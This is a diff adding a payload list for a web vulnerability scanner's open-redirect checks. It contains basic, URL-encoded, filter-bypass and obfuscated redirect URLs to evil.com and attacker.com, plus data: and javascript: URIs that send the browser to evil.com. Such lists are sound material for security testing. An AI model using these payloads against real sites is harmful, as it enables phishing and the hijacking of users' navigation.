@@ -1,0 +1,43 @@
+# Open Redirect Payloads for Web Vulnerability Scanner
+# Basic payloads
+https://evil.com
+//evil.com
+https:evil.com
+https://attacker.com
+//attacker.com
+https://google.com
+//google.com
+
+# Encoded payloads
+https%3A%2F%2Fevil.com
+%2F%2Fevil.com
+https%3Aevil.com
+%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
+
+# Bypassing filters
+https://target.com@evil.com
+https://evil.com#@target.com
+https://evil.com\.target.com
+https://evil.com%252Etarget.com
+https://target.com.evil.com
+https://target.com/redirect?url=https://evil.com
+https://target.com/redirect?url=//evil.com
+
+# Obfuscation techniques
+/\/evil.com
+/\evil.com
+https:/\/\evil.com
+/%09/evil.com
+/%0a/evil.com
+/%0d/evil.com
+/https:/evil.com
+///evil.com
+////evil.com
+https://evil.com%23.target.com
+https://evil.com%2f%2f.target.com
+
+# Data URI and JavaScript
+data:text/html,<script>window.location='https://evil.com';</script>
+javascript:window.location='https://evil.com'
+javascript:document.location='https://evil.com'
+javascript:window.open('https://evil.com')
